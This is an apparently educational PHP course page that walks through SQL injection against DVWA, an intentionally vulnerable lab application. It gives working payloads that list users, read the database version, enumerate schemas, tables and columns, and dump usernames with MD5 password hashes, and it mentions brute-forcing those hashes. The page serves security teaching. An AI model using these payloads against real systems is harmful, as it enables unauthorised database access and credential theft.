<?php
require('../db/connexionDB.php');           // Fichier PHP contenant la connexion à la BDD
session_start();                            // On démarre la session
if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur connecté, redirection vers la page de connexion
{ 
  ?>
  <script language="Javascript">
    document.location.replace("../login");
  </script>
  <?php
}
?>

<!DOCTYPE html>
<html lang="fr">
  <?php // En-tête de la page ?>
  <head>
    <?php // Balises meta responsive ?>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale-1">

    <?php // Bootstrap CSS ?>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    
    <?php // jQuery et Bootstrap JS ?>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    
    <?php // Feuille de style ?>
    <link rel="stylesheet" href="../style.css">

    <?php // Titre principal et icône de la page ?>
    <title>SQL Injection</title>
    <link rel="icon" type="image/png" sizes="16x16" href="../images/deathstarw.png">
  </head>

  <?php // Corps de la page ?>
  <body style="background-color: rgba(45,54,69)">
    <?php 
    // Inclusion de la barre de navigation
    require_once('menuCourses.php');

    // Mise en place d'un fil d'Arianne
    ?>
    <div class="centrer" style="box-shadow: 0 5px 5px rgba(0, 0, 0, .2);">  
      <div class="breadcrumb">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
              <li class="breadcrumb-item"><a href="../index">Home</a></li>
              <li class="breadcrumb-item"><a href="../course">Courses</a></li>
              <li class="breadcrumb-item active" aria-current="page">SQL injection on a vulnerable website</li>
            </ol>
          </nav>
      </div>
      <h1>SQL injection on a vulnerable website</h1>
      </br>
      </br>
    </div>
    </br>
    </br>
    <?php // Cours ?>
    <div class="container-fluid">
     
      
      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            The objective of this exercise is to study and test different vulnerabilities of a local vulnerable web application (DWVA).
            </br>
            </br>
            DVWA is designed for developers who want to learn how to protect their web applications. Damn Vulnerable Web App (DVWA) is an intentionally vulnerable PHP / MySQL web application.
            </br>
            </br>
            Its goal is to help security professionals test their tools in a legal environment, to help developers gain a better understanding of the process of securing web applications.
            </br>
            </br>
            </br>
            </br>
            An SQL injection is a type of exploitation of a security vulnerability in an application interacting with a database, by injecting an SQL request not intended by the system and which could compromise its security. In the case of our application we have 3 security levels: LOW LEVEL, MEDIUM LEVEL and HIGH LEVEL.
            </br>
            </br>
            We will focus on LOW.
            </br>
            </br>
            There are cheat sheets for useful commands for performing SQL injections
            </br>
            </br>
            <a target="_blank" style="text-decoration:underline" href="https://www.asafety.fr/mysql-injection-cheat-sheet/#Recuperer_le_nom_des_tables">https://www.asafety.fr/mysql-injection-cheat-sheet/#Recuperer_le_nom_des_tables</a>
            </br>
            </br>
            Below are SQL commands to display data contained in the database.
            </br>
            </br>
            - Show all users:
            </br>
            </br>
            <kbd>1' or 1=1 -- '</kbd>
            </br>
          </p>
        </div>
      </div>


      <div class="row justify-content-center">
        <div class="group col-sm-0">      
        <img src="../images/sqldvwa1.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
        </div>
      </div>

      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            - Display the version of the database:
            </br>
            </br>
            <kbd>' union select 1, @@version -- '</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa2.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>


        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            -	Display the INFORMATION_SCHEMA tables:
            </br>
            </br>
            <kbd>' union select 1, schema_name from information_schema.schemata -- -</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa3.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>

        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            INFORMATION_SCHEMA is the database, the place that stores information about all the other databases that the MySQL server maintains.
            </br>
            </br>
            - Show all tables:
            </br>
            </br>
            <kbd>1' UNION SELECT 1, table_name FROM information_schema.tables -- '</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa4.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>    

        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            As we can see in the image above, we have displayed all the table names that the database contains. But we are not interested in all tables, we will eventually look for a table that could contain a username and password.
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa5.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>    
    
        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            -	Display the "user" table:
            </br>
            </br>
            <kbd>1' UNION SELECT 1, column_name FROM information_schema.columns where table_name='users' -- '</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa6.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div> 

        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            Now we want username and password and we can see in the image above that it contains the column name “user” and “password”.
            </br>
            </br>
            We are now looking for all usernames and passwords by launching another query.
            </br>
            </br>
            - Display the user and password of the "user" table:
            </br>
            </br>
            <kbd>1' UNION SELECT user, password FROM users -- '</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa7.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>

        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            So we extracted the passwords from the user table.
            </br>
            </br>
            The passwords are in MD5 hash format, it is possible to use a bruteforce tool to retrieve the passwords in the clear.
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa8.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>   

    

    </div>
  </body>
  <?php 
  // Inclusion de la barre de navigation
  require_once('footerCourses.php'); 
  ?>
</html>